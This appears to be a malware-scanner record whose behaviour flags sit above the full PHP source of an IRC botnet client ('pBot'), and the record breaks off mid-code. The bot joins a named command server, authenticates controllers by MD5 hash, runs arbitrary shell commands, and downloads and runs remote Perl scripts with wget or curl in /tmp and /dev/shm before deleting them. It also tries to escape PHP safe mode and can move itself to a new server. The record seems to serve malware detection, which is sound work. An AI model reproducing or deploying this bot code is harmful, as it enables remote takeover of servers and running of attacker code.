{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "Windows": "May enumerate application windows",
            "chr": "May attempt to obfuscate specific str",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "popen": "May run an executable file or a system command on a Mac",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "<?php\n\n\tset_time_limit( 0 );\n\terror_reporting( 0 );\nignore_user_abort(true);\n\techo \"Success!\";\n\n\tclass pBot \n\t{\n\t\tvar $using_encode = false;\n\t\t\n\t\tvar $config = array(\n\t\t\t'server' \t=> 'oishi.r00t.la',\t//server here (base64)\n\t\t\t'port'\t\t=> 6667,\n\t\t\t'chan'\t\t=> 'machine',\t\t//channel here (base64) DO NOT USE \"#\", \"#lazy\" = \"lazy\"\n\t\t\t'key'\t\t=> '',\n\t\t\t'nickform'\t=> 'machine%d',\n\t\t\t'identp'\t=> 'machine',\n\t\t\t'modes'\t\t=> '+p',\n\t\t\t'maxrand'\t=> 5,\n\t\t\t'cprefix'\t=> '.',\n\t\t\t'host'\t\t=> '*'\n\t\t);\n\n\t\tvar $admins = array\n\t\t( \n\t\t\t'sherif' => 'd2f65a6de6c5d856d338bda0c9c60c06',\n\t\t\t\n\t\t);\n\t\t\n\t\tfunction auth_host( $nick, $password, $host )\n\t\t{\n\t\t\t$admin_count = count( $this->admins );\n\t\t\tif( $admin_count > 0 )\n\t\t\t{\n\t\t\t\t$mpass = md5( $password );\n\t\t\t\tif( $this->admins[ $nick ] == $mpass )\n\t\t\t\t{\n\t\t\t\t\t$this->users[ $host ] = true;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t$this->users[ $host ] = true;\n\t\t\t}\n\t\t}\n\t\t\n\t\tfunction is_authed( $host )\n\t\t{\n\t\t\treturn isset( $this->users[ $host ] );\n\t\t}\n\t\t\n\t\tfunction remove_auth( $host )\n\t\t{\n\t\t\tunset( $this->users[ $host ] );\n\t\t}\n\t\t\n\t\tfunction ex( $cfe )\n\t\t{\n\t\t\t$res = '';\n\t\t\tif (!empty($cfe))\n\t\t\t{\n\t\t\t\tif(function_exists('class_exists') && class_exists('Perl'))\n\t\t\t\t{\n\t\t\t\t\t$perl = new Perl();\n\t\t\t\t\t$perl->eval( \"system('$cfe');\" );\n\t\t\t\t}\n\t\t\t\tif(function_exists('exec'))\n\t\t\t\t{\n\t\t\t\t\t@exec($cfe,$res);\n\t\t\t\t\t$res = join(\"\\n\",$res);\n\t\t\t\t}\n\t\t\t\telseif(function_exists('shell_exec'))\n\t\t\t\t{\n\t\t\t\t\t$res = @shell_exec($cfe);\n\t\t\t\t}\n\t\t\t\telseif(function_exists('system'))\n\t\t\t\t{\n\t\t\t\t\t@ob_start();\n\t\t\t\t\t@system($cfe);\n\t\t\t\t\t$res = @ob_get_contents();\n\t\t\t\t\t@ob_end_clean();\n\t\t\t\t}\n\t\t\t\telseif(function_exists('passthru'))\n\t\t\t\t{\n\t\t\t\t\t@ob_start();\n\t\t\t\t\t@passthru($cfe);\n\t\t\t\t\t$res = @ob_get_contents();\n\t\t\t\t\t@ob_end_clean();\n\t\t\t\t}\n\t\t\t\telseif(function_exists('proc_open'))\n\t\t\t\t{\n\t\t\t\t\t$res = proc_open($cfe);\n\t\t\t\t}\n\t\t\t\telseif(@is_resource($f = @popen($cfe,\"r\")))\n\t\t\t\t{\n\t\t\t\t\t$res = \"\";\n\t\t\t\t\twhile(!@feof($f)) { $res .= @fread($f,1024); }\n\t\t\t\t\t@pclose($f);\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn $res;\n\t\t}\n\t\t\n\t\tfunction is_safe( )\n\t\t{\n\t\t\tif( ( @eregi( \"uid\", $this->ex( \"id\" ) ) ) || ( @eregi( \"Windows\", $this->ex( \"net start\" ) ) ) )\n\t\t\t{\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\treturn 1;\n\t\t}\n\t\t\n\t\tfunction get_chan( )\n\t\t{\n\t\t\tif( $this->using_encode )\n\t\t\t{\n\t\t\t\treturn '#'.base64_decode( $this->config[ 'chan' ] );\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\treturn '#'.$this->config[ 'chan' ];\n\t\t\t}\n\t\t}\n\t\t\n\t\tfunction start() \n\t\t{\n\t\t\tif( $this->using_encode )\n\t\t\t{\n\t\t\t\tif(!($this->conn = fsockopen(base64_decode($this->config['server']),$this->config['port'],$e,$s,30))) \n\t\t\t\t{\n\t\t\t\t\t$this->start(); \n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tif(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) \n\t\t\t\t{\n\t\t\t\t\t$this->start(); \n\t\t\t\t}\n\t\t\t}\n\t\t\t\t\n\t\t\t$ident = $this->config['prefix'];\n\t\t\t$alph = range(\"0\",\"9\");\n\t\t\tfor( $i=0; $i < $this->config['maxrand']; $i++ )\n\t\t\t{\n\t\t\t\t$ident .= $alph[rand(0,9)];\n\t\t\t}\n\t\t\t\t\n\t\t\tif( strlen( $this->config[ 'pass' ] ) > 0 )\n\t\t\t{\n\t\t\t\t$this->send( \"PASS \".$this->config[ 'pass' ] );\n\t\t\t}\n\t\t\t\t\n\t\t\t$this->send(\"USER \".$ident.\" 127.0.0.1 localhost :\".php_uname().\"\");\n\t\t\t$this->set_nick( );\n\t\t\t$this->main( );\n\t\t}\n\n\t\tfunction main() \n\t\t{ \n\t\t\twhile(!feof($this->conn)) \n\t\t\t{ \n\t\t\t\t$this->buf = trim(fgets($this->conn,512)); \n\t\t\t\t$cmd = explode(\" \",$this->buf); \n\t\t\t\tif(substr($this->buf,0,6)==\"PING :\") \n\t\t\t\t{ \n\t\t\t\t\t$this->send(\"PONG :\".substr($this->buf,6)); \n\t\t\t\t} \n\t\t\t\tif(isset($cmd[1]) && $cmd[1] ==\"001\") \n\t\t\t\t{ \n\t\t\t\t\t$this->send(\"MODE \".$this->nick.\" \".$this->config['modes']); \n\t\t\t\t\t\n\t\t\t\t\tif( $this->using_encode )\n\t\t\t\t\t{\n\t\t\t\t\t\t$this->join($this->get_chan( ),base64_decode($this->config['key']));\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\t$this->join($this->get_chan( ),$this->config['key']);\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tif (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }\n\t\t\t\t\telse { $safemode = \"off\"; }\n\t\t\t\t\t$uname = php_uname(); \n\t\t\t\t} \n\t\t\t\tif(isset($cmd[1]) && $cmd[1]==\"433\") \n\t\t\t\t{ \n\t\t\t\t\t$this->set_nick(); \n\t\t\t\t} \n\t\t\t\tif($this->buf != $old_buf) \n\t\t\t\t{ \n\t\t\t\t\t$mcmd = array(); \n\t\t\t\t\t$msg = substr(strstr($this->buf,\" :\"),2); \n\t\t\t\t\t$msgcmd = explode(\" \",$msg); \n\t\t\t\t\t$nick = explode(\"!\",$cmd[0]); \n\t\t\t\t\t$vhost = explode(\"@\",$nick[1]); \n\t\t\t\t\t$vhost = $vhost[1]; \n\t\t\t\t\t$nick = substr($nick[0],1); \n\t\t\t\t\t$host = $cmd[0]; \n\t\t\t\t\tif($msgcmd[0]==$this->nick) \n\t\t\t\t\t{ \n\t\t\t\t\t\tfor($i=0;$i<count($msgcmd);$i++) \n\t\t\t\t\t\t\t$mcmd[$i] = $msgcmd[$i+1]; \n\t\t\t\t\t} \n\t\t\t\t\telse \n\t\t\t\t\t{ \n\t\t\t\t\t\tfor($i=0;$i<count($msgcmd);$i++) \n\t\t\t\t\t\t\t$mcmd[$i] = $msgcmd[$i]; \n\t\t\t\t\t} \n\t\t\t\t\tif(count($cmd)>2) \n\t\t\t\t\t{ \n\t\t\t\t\t\tswitch($cmd[1]) \n\t\t\t\t\t\t{ \n\t\t\t\t\t\t\tcase \"QUIT\":\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tif( $this->is_authed( $host ) )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t$this->remove_auth( $host );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tbreak; \n\t\t\t\t\t\t\tcase \"PART\": \n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tif( $this->is_authed( $host ) )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t$this->remove_auth( $host );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tbreak; \n\t\t\t\t\t\t\tcase \"PRIVMSG\": \n\t\t\t\t\t\t\t\tif( ( substr($mcmd[0],0,1) == $this->config[ 'cprefix' ] ) ) \n\t\t\t\t\t\t\t\t{ \n\t\t\t\t\t\t\t\t\tif( $this->is_authed( $host ) == false )\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\tswitch( substr( $mcmd[ 0 ], 1 ) )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\tcase \"auth\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$this->auth_host( $nick, $mcmd[ 1 ], $host );\n\t\t\t\t\t\t\t\t\t\t\t\tif( $this->is_authed( $host ) )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ auth ] Successful login from [ \".$nick.\" ]\" );\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ auth ] Failed attempt from [ \".$nick.\" ]\" );\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\tswitch(substr($mcmd[0],1)) \n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\tcase \"exec\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\tif( !$this->is_safe( ) )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$command = substr( strstr( $msg, $mcmd[0] ), strlen( $mcmd[0] ) + 1 );\n\t\t\t\t\t\t\t\t\t\t\t\t\t$returndata = $this->ex( $command );\n\t\t\t\t\t\t\t\t\t\t\t\t\tif( !empty( $returndata ) )\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ exec ] '.$returndata );\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"info\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$safemode = \"on\";\n\t\t\t\t\t\t\t\t\t\t\t\tif( !$this->is_safe( ) )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$safemode = \"off\";\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ info ] '.php_uname( ).' ( SAFE: '.$safemode.' )' );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"safe\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$safemode = \"on\";\n\t\t\t\t\t\t\t\t\t\t\t\tif( !$this->is_safe( ) )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$safemode = \"off\";\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ safe ] '.$safemode );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"uname\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ uname ] '.php_uname( ) );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"dropperl\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\tif( $this->is_safe( ) )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ dropperl ] Safe mode is ON' );\n\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t$perl_file = $mcmd[1];\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\tif( !empty( $perl_file ) )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$parsed_url = $this->parse_url_s( $perl_file );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t$new_remote = $parsed_url[ 'scheme' ].'://'.$parsed_url[ 'host' ].$parsed_url[ 'dir' ].'/';\n\t\t\t\t\t\t\t\t\t\t\t\t\t$new_local \t= $parsed_url[ 'file' ];\n\t\t\t\t\t\t\t\t\t\t\t\t\t$file_type\t= $parsed_url[ 'file_ext' ];\n\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /tmp;wget '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /tmp;curl -O '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /tmp;lwp-download '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /tmp;lynx -source '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /dev/shm;wget '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /dev/shm;curl -O '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /dev/shm;lwp-download '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /dev/shm;lynx -source '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /tmp;rm -rf *'.$file_type.'**');\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /dev/shm;rm -rf *'.$file_type.'**');\n\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ execrfi ] Executed file '.$new_remote.$new_local );\n\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ execrfi ] Failure executing '.$perl_file );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"ip\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ ip ] '.$_SERVER['SERVER_ADDR'] );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"execrfi\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$fileUrl = $mcmd[1];\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\tif( !empty( $fileUrl ) )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$urli = parse_url( $fileUrl );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\tif( !empty( $urli['host'] ) && !empty( $urli['path'] ) && !empty( $urli['query'] ) )\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$fp = fsockopen( $urli['host'], 80, $errno, $errstr, 5 );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tif( $fp )\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out = \"GET /\".$urli['path'].$urli['query'].\" HTTP/1.1\\r\\n\";\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out .= \"Host: \".$urli['host'].\"\\r\\n\";\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out .= \"Keep-Alive: 300\\r\\n\";\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out .= \"Connection: keep-alive\\r\\n\\r\\n\";\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tfwrite( $fp, $out );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$get_data = '';\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\twhile(!feof($fp))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{ $get_data .= fgets( $fp, 256 ); }\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ execrfi ] Executed file '.$fileUrl );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ execrfi ] Failure executing '.$fileUrl );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"base64\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$str_ed = substr( strstr( $msg, $mcmd[1] ), strlen( $mcmd[1] ) + 1 );\n\t\t\t\t\t\t\t\t\t\t\t\tswitch( $mcmd[1] )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\tcase \"encode\":\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ base64 ] encode [ '\".$str_ed.\"' -> '\".base64_encode($str_ed).\"' ]\" );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\tcase \"decode\":\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ base64 ] decode [ '\".$str_ed.\"' -> '\".base64_decode($str_ed).\"' ]\" );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"md5\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$str_md5 = substr( strstr( $msg, $mcmd[0] ), strlen( $mcmd[0] ) + 1 );\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ md5 ] [ '\".$str_md5.\"' -> '\".md5($str_md5).\"' ]\" );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"dns\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\tif(isset($mcmd[1])) \n                               \t\t\t\t\t{\n                                  \t\t\t\t\t$ip = explode(\".\",$mcmd[1]); \n                                  \t\t\t\t\tif(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t&& is_numeric($ip[2]) && is_numeric($ip[3])) \n                                  \t\t\t\t\t{\n                                     \t\t\t\t\t$this->privmsg($this->get_chan( ),\"[ dns ]: \".$mcmd[1].\" => \".gethostbyaddr($mcmd[1])); \n                                  \t\t\t\t\t}\n                                  \t\t\t\t\telse \n                                  \t\t\t\t\t{\n                                     \t\t\t\t\t$this->privmsg($this->get_chan( ),\"[ dns ]: \".$mcmd[1].\" => \".gethostbyname($mcmd[1])); \n                                  \t\t\t\t\t}\n                               \t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"exit\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\tfclose( $this->conn );\n\t\t\t\t\t\t\t\t\t\t\t\texit( );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"restart\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ restart ] executed by [\".$nick.\"]\" );\n\t\t\t\t\t\t\t\t\t\t\t\t$this->send( \"QUIT :restart command from \".$nick );\n\t\t\t\t\t\t\t\t\t\t\t\tfclose( $this->conn );\n\t\t\t\t\t\t\t\t\t\t\t\t$this->start();\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"breaksafe\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\tif( $this->is_safe( ) )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\tini_restore( \"safe_mode\" );\n\t\t\t\t\t\t\t\t\t\t\t\t\tini_restore( \"open_basedir\" );\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t$safemode = \"on\";\n\t\t\t\t\t\t\t\t\t\t\t\tif( !$this->is_safe( ) )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$safemode = \"off\";\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->set_nick();\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), '[ safe ] '.$safemode );\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"moveserver\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\tif( count( $mcmd ) > 3 )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$server = $mcmd[1];\n\t\t\t\t\t\t\t\t\t\t\t\t\t$port = $mcmd[2];\n\t\t\t\t\t\t\t\t\t\t\t\t\t$channel = $mcmd[3];\n\t\t\t\t\t\t\t\t\t\t\t\t\t$key = $mcmd[4];\n\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\tif( $this->using_encode )\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'server' ] = base64_encode( $server );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'chan' ] = base64_encode( str_replace( \"#\", \"\", $channel ) );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'key' ] = base64_encode( $key );\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'server' ] = $server;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'chan' ] = str_replace( \"#\", \"\", $channel );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'key' ] = $key;\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'port' ] = $port;\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ moveserver ] \".$server.\" => \".$port.\" => \".$channel.\" => \".$key );\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->send( \"QUIT :moveserver command from \".$nick );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\tfclose( $this->conn );\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->start();\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"whois\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$param2 = $mcmd[1];\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\tif( !empty( $param2 ) )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t//do it\n\t\t\t\t\t\t\t\t\t\t\t\t\t//http://ws.arin.net/whois/?queryinput=127.0.0.1\n\t\t\t\t\t\t\t\t\t\t\t\t\t$fp = fsockopen( \"ws.arin.net\", 80, $errno, $errstr, 30 );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\tif( $fp )\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out = \"GET /whois/?queryinput=$param2 HTTP/1.1\\r\\n\";\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out .= \"Host: ws.arin.net\\r\\n\";\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out .= \"Keep-Alive: 300\\r\\n\";\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$out .= \"Connection: keep-alive\\r\\n\\r\\n\";\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tfwrite( $fp, $out );\n\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$whodata = '';\n\t\t\t\t\t\t\t\t\t\t\t\t\t\twhile(!feof($fp))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t/*do nothing*/\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$whodata .= fread( $fp, 1024 );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$explk = explode( \"<div id=\\\"content\\\">\", $whodata );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$explk = explode( \"</div>\", $explk[1] );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$htmldat = strip_tags( $explk[0] 